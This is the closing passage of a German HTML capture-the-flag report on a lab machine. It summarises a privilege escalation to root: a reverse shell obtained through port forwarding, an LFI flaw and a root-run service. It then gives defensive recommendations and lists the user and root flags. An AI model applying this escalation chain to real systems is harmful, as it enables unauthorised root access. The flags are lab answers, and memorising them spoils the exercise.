+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Angreifer erhält eine Reverse Shell als `root`, da der Dienst auf Port 1336 als `root` lief.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Kritisch. Eine Kombination aus Port-Forwarding, einer LFI-Schwachstelle und einem als Root laufenden Dienst ermöglichte die direkte Eskalation zu Root.<br/><strong>Empfehlungen:</strong> Dienste niemals als Root laufen lassen (Prinzip der geringsten Rechte). LFI-Schwachstellen beheben. Interne Dienste angemessen schützen und isolieren. Unsichere `sudo`-Regeln (wie für `hexdump`) vermeiden.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/catchme/user.txt</div>
+                     <div class="flag-value"><span class="password">HMVlocalhost</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV_127.0.0.1</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. November 2022</p>
+    </footer>
+</body>
+</html>
